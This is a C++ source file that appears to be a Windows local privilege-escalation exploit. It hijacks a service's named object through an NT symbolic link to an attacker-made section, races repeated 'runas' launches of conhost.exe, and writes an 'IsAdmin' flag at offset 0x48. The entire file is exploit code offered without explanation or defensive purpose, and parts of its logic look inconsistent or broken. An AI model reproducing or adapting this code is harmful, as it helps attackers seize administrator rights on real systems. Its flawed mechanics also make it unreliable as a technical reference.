#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

typedef NTSTATUS (NTAPI* _NtCreateSymbolicLinkObject)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING);
typedef NTSTATUS (NTAPI* _NtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);

volatile BOOL bKeepRunning = TRUE;

DWORD WINAPI TriggerRace(LPVOID lpParam) {
    SHELLEXECUTEINFO shi = { sizeof(shi) };
    shi.fMask = SEE_MASK_NOZONECHECKS | SEE_MASK_ASYNCOK;
    shi.lpVerb = L"runas";
    shi.lpFile = L"C:\\Windows\\System32\\conhost.exe";
    shi.nShow = SW_HIDE;

    while (bKeepRunning) {
        ShellExecuteEx(&shi);
        for (int i = 0; i < 100; i++) YieldProcessor();
    }
    return 0;
}

int wmain() {
    HANDLE hLink = NULL, hSection = NULL, hMapping = NULL, hThread = NULL;
    DWORD sessionId = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);

    wchar_t linkPath[256];
    swprintf(linkPath, 256, L"\\Sessions\\%lu\\BaseNamedObjects\\TargetServiceConfig", sessionId);

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtCreateSymbolicLinkObject = (_NtCreateSymbolicLinkObject)GetProcAddress(ntdll, "NtCreateSymbolicLinkObject");
    auto NtOpenSection = (_NtOpenSection)GetProcAddress(ntdll, "NtOpenSection");

    UNICODE_STRING linkName, targetName;
    OBJECT_ATTRIBUTES objAttr;

    RtlInitUnicodeString(&linkName, linkPath);
    RtlInitUnicodeString(&targetName, L"\\BaseNamedObjects\\JoeyExploitSection");
    InitializeObjectAttributes(&objAttr, &linkName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    if (NtCreateSymbolicLinkObject(&hLink, SYMBOLIC_LINK_ALL_ACCESS, &objAttr, &targetName) != 0) return 1;

    hSection = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, 0x1000, L"JoeyExploitSection");
    void* pSharedMemory = MapViewOfFile(hSection, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    if (!pSharedMemory) goto cleanup;

    memset(pSharedMemory, 0, 0x1000);

    hThread = CreateThread(NULL, 0, TriggerRace, NULL, 0, NULL);
    if (hThread) SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);

    InitializeObjectAttributes(&objAttr, &targetName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    while (true) {
        if (NtOpenSection(&hMapping, SECTION_ALL_ACCESS, &objAttr) == 0) {
            // WinDbg-confirmed: 'IsAdmin' flag at offset 0x48 in the service struct.
            *((DWORD*)pSharedMemory + (0x48 / 4)) = 0x1;
            bKeepRunning = FALSE;
            break;
        }
    }

    // Re-fire the elevation event — forces the service back into the code path
    // that reads the shared section and acts on the 0x48 flag.
    // NOTE: system("net helpmsg") is a lookup command; it sends no signal to
    // the service and must not be used here.
    {
        SHELLEXECUTEINFO retrigger = { sizeof(retrigger) };
        retrigger.fMask = SEE_MASK_NOZONECHECKS;
        retrigger.lpVerb = L"runas";
        retrigger.lpFile = L"C:\\Windows\\System32\\conhost.exe";
        retrigger.nShow = SW_HIDE;
        ShellExecuteEx(&retrigger);
    }

cleanup:
    if (hThread) {
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
    }
    if (hMapping) CloseHandle(hMapping);
    if (hLink) CloseHandle(hLink);
    if (hSection) CloseHandle(hSection);

    return 0;
}
